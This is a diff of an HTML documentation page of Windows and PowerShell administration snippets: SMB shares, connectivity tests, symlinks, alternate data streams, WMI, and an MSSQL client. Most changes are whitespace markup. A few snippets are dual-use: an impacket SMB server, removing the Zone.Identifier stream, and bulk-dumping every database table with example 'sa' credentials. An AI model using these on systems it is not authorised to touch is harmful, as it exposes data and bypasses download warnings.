+<span class="nv">$shares</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Get-CIMInstance<span class="w"> </span>-Classname<span class="w"> </span>Win32_Share<span class="w"> </span>-computername<span class="w"> </span>my-server<span class="w"> </span>-filter<span class="w"> </span><span class="s2">&quot;Type=0&quot;</span>
+<span class="nv">$shares</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>foreach<span class="w"> </span><span class="o">{</span>
+<span class="s2">&quot;     Share Name   : &quot;</span><span class="w"> </span>+<span class="w"> </span><span class="nv">$_</span>.name<span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;</span>
+<span class="s2">     Source Folder: &quot;</span><span class="w"> </span>+<span class="w"> </span><span class="nv">$_</span>.path<span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;</span>
+<span class="s2">     Description  : &quot;</span><span class="w"> </span>+<span class="w"> </span><span class="nv">$_</span>.Description<span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;</span>
+<span class="s2">     Caption      : &quot;</span><span class="w"> </span>+<span class="w"> </span><span class="nv">$_</span>.Caption<span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;</span>
+<span class="s2">     Type         : &quot;</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="s1">&#39;0x{0:x}&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="nv">$_</span>.Type<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;</span>
 <span class="s2">&quot;</span>
 <span class="o">}</span>
 
 <span class="c1"># Mount a share to a drive letter</span>
-net use /user:me Z: <span class="se">\\</span>my-server<span class="se">\m</span>y-share
-New-PSDrive -Name <span class="s2">&quot;Z&quot;</span> -PSProvider FileSystem -Root <span class="s2">&quot;\\my-server\my-share&quot;</span>
+net<span class="w"> </span>use<span class="w"> </span>/user:me<span class="w"> </span>Z:<span class="w"> </span><span class="se">\\</span>my-server<span class="se">\m</span>y-share
+New-PSDrive<span class="w"> </span>-Name<span class="w"> </span><span class="s2">&quot;Z&quot;</span><span class="w"> </span>-PSProvider<span class="w"> </span>FileSystem<span class="w"> </span>-Root<span class="w"> </span><span class="s2">&quot;\\my-server\my-share&quot;</span>
 </pre></div>
 </div>
 <p>In order to easily provide files to a Windows host from a Linux system, it is possible to use impacket to start a simple Samba server:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>smbserver.py -smb2support -username me -password mypass my-share /path/to/my-share
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span>-username<span class="w"> </span>me<span class="w"> </span>-password<span class="w"> </span>mypass<span class="w"> </span>my-share<span class="w"> </span>/path/to/my-share
 </pre></div>
 </div>
 </section>
 <section id="other-network-commands">
-<h2>Other network commands<a class="headerlink" href="#other-network-commands" title="Permalink to this headline">¶</a></h2>
+<h2>Other network commands<a class="headerlink" href="#other-network-commands" title="Link to this heading">¶</a></h2>
 <p>Some scripts such as <a class="reference external" href="https://github.com/thom-s/netsec-ps-scripts/blob/master/printer-telnet-ftp-report/printer-telnet-ftp-report.ps1">https://github.com/thom-s/netsec-ps-scripts/blob/master/printer-telnet-ftp-report/printer-telnet-ftp-report.ps1</a> use PowerShell cmdlets in order to perform connectivity tests:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Send a ping to the given IP address</span>
-Test-Connection -ComputerName <span class="m">192</span>.0.2.42 -Quiet -Count <span class="m">1</span> -InformationAction Ignore
+Test-Connection<span class="w"> </span>-ComputerName<span class="w"> </span><span class="m">192</span>.0.2.42<span class="w"> </span>-Quiet<span class="w"> </span>-Count<span class="w"> </span><span class="m">1</span><span class="w"> </span>-InformationAction<span class="w"> </span>Ignore
 
 <span class="c1"># Test telnet connectivity</span>
-<span class="nv">$result</span> <span class="o">=</span> Test-NetConnection -ComputerName <span class="m">192</span>.0.2.42 -Port <span class="m">23</span>
+<span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Test-NetConnection<span class="w"> </span>-ComputerName<span class="w"> </span><span class="m">192</span>.0.2.42<span class="w"> </span>-Port<span class="w"> </span><span class="m">23</span>
 <span class="nv">$result</span>.PingSucceeded
 <span class="nv">$result</span>.TcpTestSucceeded
 
 <span class="c1"># Open a network socket to FTP port</span>
-<span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TcpClient<span class="o">(</span><span class="m">192</span>.0.2.42, <span class="m">21</span><span class="o">)</span>
+<span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Net.Sockets.TcpClient<span class="o">(</span><span class="m">192</span>.0.2.42,<span class="w"> </span><span class="m">21</span><span class="o">)</span>
 <span class="nv">$client</span>.Close<span class="o">()</span>
 </pre></div>
 </div>
@@ -756,52 +747,52 @@ Test-Connection -ComputerName <span class="m">192</span>.0.2.42 -Quiet -Count <s
 </ul>
 </section>
 <section id="filesystem-management">
-<h2>Filesystem management<a class="headerlink" href="#filesystem-management" title="Permalink to this headline">¶</a></h2>
+<h2>Filesystem management<a class="headerlink" href="#filesystem-management" title="Link to this heading">¶</a></h2>
 <p>Since Windows Vista, it is possible to create symbolic links on Windows:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Create a symbolic link to a file</span>
-mklink <span class="s2">&quot;C:\Path\to\link\file&quot;</span> <span class="s2">&quot;C:\Path\to\target\file&quot;</span>
+mklink<span class="w"> </span><span class="s2">&quot;C:\Path\to\link\file&quot;</span><span class="w"> </span><span class="s2">&quot;C:\Path\to\target\file&quot;</span>
 
 <span class="c1"># Create a symbolic link to a directory</span>
-mklink /D <span class="s2">&quot;C:\Path\to\link\directory&quot;</span> <span class="s2">&quot;C:\Path\to\target\directory&quot;</span>
+mklink<span class="w"> </span>/D<span class="w"> </span><span class="s2">&quot;C:\Path\to\link\directory&quot;</span><span class="w"> </span><span class="s2">&quot;C:\Path\to\target\directory&quot;</span>
 
 <span class="c1"># With PowerShell 5.0 (Windows 10)</span>
-New-Item -Path <span class="s2">&quot;C:\Path\to\link&quot;</span> -ItemType SymbolicLink -Value <span class="s2">&quot;C:\Path\to\target&quot;</span>
+New-Item<span class="w"> </span>-Path<span class="w"> </span><span class="s2">&quot;C:\Path\to\link&quot;</span><span class="w"> </span>-ItemType<span class="w"> </span>SymbolicLink<span class="w"> </span>-Value<span class="w"> </span><span class="s2">&quot;C:\Path\to\target&quot;</span>
 </pre></div>
 </div>
 <p>The command to mount a volume on a path is <a class="reference external" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mountvol">mountvol</a>:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Example from Microsoft documentation</span>
-mountvol <span class="se">\s</span>ysmount <span class="se">\\</span>?<span class="se">\V</span>olume<span class="se">\{</span>2eca078d-5cbc-43d3-aff8-7e8511f60d0e<span class="o">}</span><span class="se">\</span>
+mountvol<span class="w"> </span><span class="se">\s</span>ysmount<span class="w"> </span><span class="se">\\</span>?<span class="se">\V</span>olume<span class="se">\{</span>2eca078d-5cbc-43d3-aff8-7e8511f60d0e<span class="o">}</span><span class="se">\</span>
 
 <span class="c1"># Enumerate the volumes from PowerShell</span>
-Get-WmiObject Win32_Volume
+Get-WmiObject<span class="w"> </span>Win32_Volume
 </pre></div>
 </div>
 <p>It is also possible to associate a path with a drive letter using command <a class="reference external" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/subst">subst</a>:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>subst Z: <span class="s2">&quot;C:\my\path&quot;</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>subst<span class="w"> </span>Z:<span class="w"> </span><span class="s2">&quot;C:\my\path&quot;</span>
 
 <span class="c1"># Remove the association</span>
-subst Z: /d
+subst<span class="w"> </span>Z:<span class="w"> </span>/d
 </pre></div>
 </div>
 </section>
 <section id="alternate-data-streams">
-<h2>Alternate Data Streams<a class="headerlink" href="#alternate-data-streams" title="Permalink to this headline">¶</a></h2>
+<h2>Alternate Data Streams<a class="headerlink" href="#alternate-data-streams" title="Link to this heading">¶</a></h2>
 <p>Get files with <code class="docutils literal notranslate"><span class="pre">Zone.Identifier</span></code> alternate data stream (ADS):</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-ChildItem -Recurse <span class="p">|</span> Get-Item -Stream Zone.Identifier -ErrorAction SilentlyContinue <span class="p">|</span>
-    Select-Object FileName
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-ChildItem<span class="w"> </span>-Recurse<span class="w"> </span><span class="p">|</span><span class="w"> </span>Get-Item<span class="w"> </span>-Stream<span class="w"> </span>Zone.Identifier<span class="w"> </span>-ErrorAction<span class="w"> </span>SilentlyContinue<span class="w"> </span><span class="p">|</span>
+<span class="w">    </span>Select-Object<span class="w"> </span>FileName
 </pre></div>
 </div>
 <p>Read an ADS:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-Content -Stream Zone.Identifier .<span class="se">\m</span>y-application.exe
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-Content<span class="w"> </span>-Stream<span class="w"> </span>Zone.Identifier<span class="w"> </span>.<span class="se">\m</span>y-application.exe
 </pre></div>
 </div>
 <p>Remove an ADS:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Remove-Item .<span class="se">\m</span>y-application.exe -Stream Zone.Identifier
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Remove-Item<span class="w"> </span>.<span class="se">\m</span>y-application.exe<span class="w"> </span>-Stream<span class="w"> </span>Zone.Identifier
 </pre></div>
 </div>
 <p>When downloading a file from the Internet, <code class="docutils literal notranslate"><span class="pre">dir</span></code> shows a filename with suffix <code class="docutils literal notranslate"><span class="pre">:Zone.Identifier:$DATA</span></code> and with 26 bytes (each lines are ended by <code class="docutils literal notranslate"><span class="pre">&quot;\r\n&quot;</span></code>:</p>
-<div class="highlight-ini notranslate"><div class="highlight"><pre><span></span><span class="k">[ZoneTransfer]</span><span class="w"></span>
-<span class="na">ZoneId</span><span class="o">=</span><span class="s">3</span><span class="w"></span>
+<div class="highlight-ini notranslate"><div class="highlight"><pre><span></span><span class="k">[ZoneTransfer]</span>
+<span class="na">ZoneId</span><span class="o">=</span><span class="s">3</span>
 </pre></div>
 </div>
 <p>The Zone identifier is 0 for the local machine, 1 for the local intranet, 2 for trusted sites, 3 for the Internet or 4 for restricted sites.</p>
@@ -809,51 +800,51 @@ subst Z: /d
 <p>The empty ADS matches the usual content of a file. This means that the content is both accessible through <code class="docutils literal notranslate"><span class="pre">filepath</span></code> and <code class="docutils literal notranslate"><span class="pre">filepath::$DATA</span></code>.</p>
 </section>
 <section id="csv-and-table-viewer">
-<h2>CSV and table viewer<a class="headerlink" href="#csv-and-table-viewer" title="Permalink to this headline">¶</a></h2>
+<h2>CSV and table viewer<a class="headerlink" href="#csv-and-table-viewer" title="Link to this heading">¶</a></h2>
 <p>Display a simple CSV file in a simple GUI, from a PowerShell prompt:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Import-Csv -Path file.csv <span class="p">|</span> Out-GridView
-ipcsv -Path file.csv <span class="p">|</span> ogv
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Import-Csv<span class="w"> </span>-Path<span class="w"> </span>file.csv<span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-GridView
+ipcsv<span class="w"> </span>-Path<span class="w"> </span>file.csv<span class="w"> </span><span class="p">|</span><span class="w"> </span>ogv
 </pre></div>
 </div>
 <p>In order to produce a CSV from a PowerShell command:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>... <span class="p">|</span> Sort-Object -Property Timestamp <span class="p">|</span> Export-Csv file.csv -notypeinformation
-... <span class="p">|</span> sort -Property Timestamp <span class="p">|</span> epcsv file.csv -notypeinformation
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>...<span class="w"> </span><span class="p">|</span><span class="w"> </span>Sort-Object<span class="w"> </span>-Property<span class="w"> </span>Timestamp<span class="w"> </span><span class="p">|</span><span class="w"> </span>Export-Csv<span class="w"> </span>file.csv<span class="w"> </span>-notypeinformation
+...<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-Property<span class="w"> </span>Timestamp<span class="w"> </span><span class="p">|</span><span class="w"> </span>epcsv<span class="w"> </span>file.csv<span class="w"> </span>-notypeinformation
 </pre></div>
 </div>
 <p>For a table in the CLI:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>... <span class="p">|</span> Format-Table
-... <span class="p">|</span> ft
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>...<span class="w"> </span><span class="p">|</span><span class="w"> </span>Format-Table
+...<span class="w"> </span><span class="p">|</span><span class="w"> </span>ft
 
 <span class="c1"># Show all properties of the object</span>
-... <span class="p">|</span> Format-Table -Property *
-... <span class="p">|</span> ft *
+...<span class="w"> </span><span class="p">|</span><span class="w"> </span>Format-Table<span class="w"> </span>-Property<span class="w"> </span>*
+...<span class="w"> </span><span class="p">|</span><span class="w"> </span>ft<span class="w"> </span>*
 </pre></div>
 </div>
 <p>In order to show a table as a list:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>... <span class="p">|</span> Format-List
-... <span class="p">|</span> fl
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>...<span class="w"> </span><span class="p">|</span><span class="w"> </span>Format-List
+...<span class="w"> </span><span class="p">|</span><span class="w"> </span>fl
 
 <span class="c1"># Show all properties of the object</span>
-... <span class="p">|</span> Format-List -Property *
-... <span class="p">|</span> fl *
+...<span class="w"> </span><span class="p">|</span><span class="w"> </span>Format-List<span class="w"> </span>-Property<span class="w"> </span>*
+...<span class="w"> </span><span class="p">|</span><span class="w"> </span>fl<span class="w"> </span>*
 </pre></div>
 </div>
 <p>In order to filter the properties of an object, it is possible to use <code class="docutils literal notranslate"><span class="pre">Select-Object</span></code> with filters (eg. <code class="docutils literal notranslate"><span class="pre">Select-Object</span> <span class="pre">a*,</span> <span class="pre">b*</span></code> for properties that start with “a” or “b”).</p>
 <p><code class="docutils literal notranslate"><span class="pre">Select-Object</span></code> can also be used to compute new properties.
 For example, in order to compute a size in Gigabytes, it is possible to use the unit suffix <code class="docutils literal notranslate"><span class="pre">GB</span></code> and the format string <code class="docutils literal notranslate"><span class="pre">{0:N2}</span></code> which formats floats using 2 digits after the dot:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-WmiObject Win32_DiskDrive <span class="p">|</span>
-  Select-Object Model,Status,@<span class="o">{</span><span class="nv">Name</span><span class="o">=</span><span class="s1">&#39;SizeGB&#39;</span><span class="p">;</span><span class="nv">Expression</span><span class="o">={</span><span class="s2">&quot;{0:N2}&quot;</span> -f <span class="o">(</span><span class="nv">$_</span>.Size / 1GB<span class="o">)}}</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-WmiObject<span class="w"> </span>Win32_DiskDrive<span class="w"> </span><span class="p">|</span>
+<span class="w">  </span>Select-Object<span class="w"> </span>Model,Status,@<span class="o">{</span><span class="nv">Name</span><span class="o">=</span><span class="s1">&#39;SizeGB&#39;</span><span class="p">;</span><span class="nv">Expression</span><span class="o">={</span><span class="s2">&quot;{0:N2}&quot;</span><span class="w"> </span>-f<span class="w"> </span><span class="o">(</span><span class="nv">$_</span>.Size<span class="w"> </span>/<span class="w"> </span>1GB<span class="o">)}}</span>
 </pre></div>
 </div>
 </section>
 <section id="wmi">
-<h2>WMI<a class="headerlink" href="#wmi" title="Permalink to this headline">¶</a></h2>
+<h2>WMI<a class="headerlink" href="#wmi" title="Link to this heading">¶</a></h2>
 <p>WMI (Windows Management Instrumentation) provides information about many parts of the operating system:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Enumerate WMI providers</span>
-Get-WmiObject -Class __Provider <span class="p">|</span> ft
+Get-WmiObject<span class="w"> </span>-Class<span class="w"> </span>__Provider<span class="w"> </span><span class="p">|</span><span class="w"> </span>ft
 
 <span class="c1"># Get information about the OS</span>
-gwmi Win32_OperatingSystem
+gwmi<span class="w"> </span>Win32_OperatingSystem
 
 <span class="c1"># Launch a GUI to enumerate WMI classes for known namespaces (and PowerShell ScriptOMatic)</span>
 <span class="c1"># In C:\Windows\System32\wbem\wbemtest.exe</span>
@@ -861,7 +852,7 @@ wbemtest.exe
 </pre></div>
 </div>
 <p>In order to gather information about a Trusted Platform Module (TPM), the namespace needs to be changed:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$tpm</span> <span class="o">=</span> Get-WmiObject -Namespace <span class="s2">&quot;root\CIMV2\Security\MicrosoftTpm&quot;</span> -Class Win32_Tpm
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$tpm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Get-WmiObject<span class="w"> </span>-Namespace<span class="w"> </span><span class="s2">&quot;root\CIMV2\Security\MicrosoftTpm&quot;</span><span class="w"> </span>-Class<span class="w"> </span>Win32_Tpm
 <span class="nv">$tpm</span>.IsEnabled<span class="o">()</span>
 <span class="nv">$tpm</span>.IsActivated<span class="o">()</span>
 <span class="nv">$tpm</span>.IsOwned<span class="o">()</span>
@@ -870,10 +861,10 @@ wbemtest.exe
 </div>
 </section>
 <section id="mssql-client">
-<h2>MSSQL client<a class="headerlink" href="#mssql-client" title="Permalink to this headline">¶</a></h2>
+<h2>MSSQL client<a class="headerlink" href="#mssql-client" title="Link to this heading">¶</a></h2>
 <p>In order to connect to a MSSQL server from a PowerShell CLI (cf. <a class="reference external" href="https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection?view=netframework-4.7.2">https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection?view=netframework-4.7.2</a>):</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$ConnectionString</span> <span class="o">=</span> <span class="s2">&quot;Server=MSSQL-SRV\MY-INSTANCE;Database=mydb;User ID=sa;Password=sa;&quot;</span>
-<span class="nv">$SqlConnection</span> <span class="o">=</span> New-Object System.Data.SqlClient.SqlConnection<span class="o">(</span><span class="nv">$ConnectionString</span><span class="o">)</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$ConnectionString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Server=MSSQL-SRV\MY-INSTANCE;Database=mydb;User ID=sa;Password=sa;&quot;</span>
+<span class="nv">$SqlConnection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.SqlClient.SqlConnection<span class="o">(</span><span class="nv">$ConnectionString</span><span class="o">)</span>
 <span class="nv">$SqlConnection</span>.Open<span class="o">()</span>
 <span class="nv">$SqlConnection</span>.State
 <span class="c1"># Result: &quot;Open&quot;</span>
@@ -881,21 +872,21 @@ wbemtest.exe
 </div>
 <p>To run a trivial SQL query:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># The verbose way:</span>
-<span class="nv">$SqlCmd</span> <span class="o">=</span> New-Object System.Data.SqlClient.SqlCommand
-<span class="nv">$SqlCmd</span>.CommandText <span class="o">=</span> <span class="s2">&quot;SELECT 42&quot;</span>
-<span class="nv">$SqlCmd</span>.Connection <span class="o">=</span> <span class="nv">$SqlConnection</span>
-<span class="nv">$SqlAdapter</span> <span class="o">=</span> New-Object System.Data.SqlClient.SqlDataAdapter
-<span class="nv">$SqlAdapter</span>.SelectCommand <span class="o">=</span> <span class="nv">$SqlCmd</span>
-<span class="nv">$DataSet</span> <span class="o">=</span> New-Object System.Data.DataSet
+<span class="nv">$SqlCmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.SqlClient.SqlCommand
+<span class="nv">$SqlCmd</span>.CommandText<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;SELECT 42&quot;</span>
+<span class="nv">$SqlCmd</span>.Connection<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$SqlConnection</span>
+<span class="nv">$SqlAdapter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.SqlClient.SqlDataAdapter
+<span class="nv">$SqlAdapter</span>.SelectCommand<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$SqlCmd</span>
+<span class="nv">$DataSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.DataSet
 <span class="nv">$SqlAdapter</span>.Fill<span class="o">(</span><span class="nv">$DataSet</span><span class="o">)</span>
-<span class="nv">$DataSet</span>.Tables<span class="o">[</span><span class="m">0</span><span class="o">]</span> <span class="p">|</span> Format-Table
+<span class="nv">$DataSet</span>.Tables<span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Format-Table
 
 <span class="c1"># The more-compact way:</span>
-<span class="nv">$SqlCmd</span> <span class="o">=</span> New-Object System.Data.SqlClient.SqlCommand<span class="o">(</span><span class="s2">&quot;SELECT 42&quot;</span>, <span class="nv">$SqlConnection</span><span class="o">)</span>
-<span class="nv">$SqlAdapter</span> <span class="o">=</span> New-Object System.Data.SqlClient.SqlDataAdapter<span class="o">(</span><span class="nv">$SqlCmd</span><span class="o">)</span>
-<span class="nv">$DataSet</span> <span class="o">=</span> New-Object System.Data.DataSet
+<span class="nv">$SqlCmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.SqlClient.SqlCommand<span class="o">(</span><span class="s2">&quot;SELECT 42&quot;</span>,<span class="w"> </span><span class="nv">$SqlConnection</span><span class="o">)</span>
+<span class="nv">$SqlAdapter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.SqlClient.SqlDataAdapter<span class="o">(</span><span class="nv">$SqlCmd</span><span class="o">)</span>
+<span class="nv">$DataSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.DataSet
 <span class="nv">$SqlAdapter</span>.Fill<span class="o">(</span><span class="nv">$DataSet</span><span class="o">)</span>
-<span class="nv">$DataSet</span>.Tables<span class="o">[</span><span class="m">0</span><span class="o">]</span> <span class="p">|</span> Format-Table
+<span class="nv">$DataSet</span>.Tables<span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Format-Table
 </pre></div>
 </div>
 <p>In order to find out which tables the logged user has access, here are some queries:</p>
@@ -904,27 +895,27 @@ wbemtest.exe
 <li><p><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">sys.tables</span></code></p></li>
 </ul>
 <p>The following commands export the first rows of every table to files, once a <code class="docutils literal notranslate"><span class="pre">$SqlConnection</span></code> has been created:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$SqlCmd</span> <span class="o">=</span> New-Object System.Data.SqlClient.SqlCommand<span class="o">(</span><span class="s2">&quot;SELECT * FROM sys.tables&quot;</span>, <span class="nv">$SqlConnection</span><span class="o">)</span>
-<span class="nv">$SqlAdapter</span> <span class="o">=</span> New-Object System.Data.SqlClient.SqlDataAdapter<span class="o">(</span><span class="nv">$SqlCmd</span><span class="o">)</span>
-<span class="nv">$DataSet</span> <span class="o">=</span> New-Object System.Data.DataSet
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$SqlCmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.SqlClient.SqlCommand<span class="o">(</span><span class="s2">&quot;SELECT * FROM sys.tables&quot;</span>,<span class="w"> </span><span class="nv">$SqlConnection</span><span class="o">)</span>
+<span class="nv">$SqlAdapter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.SqlClient.SqlDataAdapter<span class="o">(</span><span class="nv">$SqlCmd</span><span class="o">)</span>
+<span class="nv">$DataSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.DataSet
 <span class="nv">$SqlAdapter</span>.Fill<span class="o">(</span><span class="nv">$DataSet</span><span class="o">)</span>
-<span class="nv">$AllTables</span> <span class="o">=</span> <span class="nv">$DataSet</span>.Tables<span class="o">[</span><span class="m">0</span><span class="o">]</span> <span class="p">|</span> Sort-Object -property name
+<span class="nv">$AllTables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$DataSet</span>.Tables<span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Sort-Object<span class="w"> </span>-property<span class="w"> </span>name
 
-<span class="nv">$AllTables</span> <span class="p">|</span> ForEach-Object <span class="o">{</span>
-    <span class="nv">$tblName</span> <span class="o">=</span> <span class="nv">$_</span>.name
-    <span class="nv">$csvName</span> <span class="o">=</span> <span class="s2">&quot;dump_top_&quot;</span> + <span class="nv">$tblName</span> + <span class="s2">&quot;.csv&quot;</span>
-    <span class="nb">echo</span> <span class="s2">&quot;Exporting data to &quot;</span> <span class="nv">$csvName</span>
-    <span class="nv">$SqlCmd</span> <span class="o">=</span> New-Object System.Data.SqlClient.SqlCommand<span class="o">((</span><span class="s2">&quot;SELECT TOP 10000 * FROM &quot;</span> + <span class="nv">$tblName</span><span class="o">)</span>, <span class="nv">$SqlConnection</span><span class="o">)</span>
-    <span class="nv">$SqlAdapter</span> <span class="o">=</span> New-Object System.Data.SqlClient.SqlDataAdapter<span class="o">(</span><span class="nv">$SqlCmd</span><span class="o">)</span>
-    <span class="nv">$DataSet</span> <span class="o">=</span> New-Object System.Data.DataSet
-    <span class="nv">$SqlAdapter</span>.Fill<span class="o">(</span><span class="nv">$DataSet</span><span class="o">)</span>
-    <span class="nv">$DataSet</span>.Tables<span class="o">[</span><span class="m">0</span><span class="o">]</span> <span class="p">|</span> Export-Csv <span class="nv">$csvName</span> -notypeinformation
+<span class="nv">$AllTables</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>ForEach-Object<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="nv">$tblName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_</span>.name
+<span class="w">    </span><span class="nv">$csvName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;dump_top_&quot;</span><span class="w"> </span>+<span class="w"> </span><span class="nv">$tblName</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;.csv&quot;</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Exporting data to &quot;</span><span class="w"> </span><span class="nv">$csvName</span>
+<span class="w">    </span><span class="nv">$SqlCmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.SqlClient.SqlCommand<span class="o">((</span><span class="s2">&quot;SELECT TOP 10000 * FROM &quot;</span><span class="w"> </span>+<span class="w"> </span><span class="nv">$tblName</span><span class="o">)</span>,<span class="w"> </span><span class="nv">$SqlConnection</span><span class="o">)</span>
+<span class="w">    </span><span class="nv">$SqlAdapter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.SqlClient.SqlDataAdapter<span class="o">(</span><span class="nv">$SqlCmd</span><span class="o">)</span>
+<span class="w">    </span><span class="nv">$DataSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Data.DataSet
+<span class="w">    </span><span class="nv">$SqlAdapter</span>.Fill<span class="o">(</span><span class="nv">$DataSet</span><span class="o">)</span>
+<span class="w">    </span><span class="nv">$DataSet</span>.Tables<span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Export-Csv<span class="w"> </span><span class="nv">$csvName</span><span class="w"> </span>-notypeinformation
 <span class="o">}</span>
 </pre></div>
 </div>
 <p>On a SQL Server, it is also possible to create a virtual drive (cf. <a class="reference external" href="https://docs.microsoft.com/en-us/sql/powershell/navigate-sql-server-powershell-paths?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/powershell/navigate-sql-server-powershell-paths?view=sql-server-2017</a>):</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>New-PSDrive -Name MYDB -Root SQLSERVER:<span class="se">\S</span>QL<span class="se">\l</span>ocalhost<span class="se">\D</span>EFAULT<span class="se">\D</span>atabases<span class="se">\m</span>ydb
-Set-Location MYDB:<span class="se">\T</span>ables<span class="se">\U</span>sers
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>New-PSDrive<span class="w"> </span>-Name<span class="w"> </span>MYDB<span class="w"> </span>-Root<span class="w"> </span>SQLSERVER:<span class="se">\S</span>QL<span class="se">\l</span>ocalhost<span class="se">\D</span>EFAULT<span class="se">\D</span>atabases<span class="se">\m</span>ydb
+Set-Location<span class="w"> </span>MYDB:<span class="se">\T</span>ables<span class="se">\U</span>sers
 </pre></div>
 </div>
 </section>
@@ -937,8 +928,9 @@ Set-Location MYDB:<span class="se">\T</span>ables<span class="se">\U</span>sers
       </div>
       <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
         <div class="sphinxsidebarwrapper">
-  <h3><a href="../index.html">Table of Contents</a></h3>
-  <ul>
+  <div>
+    <h3><a href="../index.html">Table of Contents</a></h3>
+    <ul>
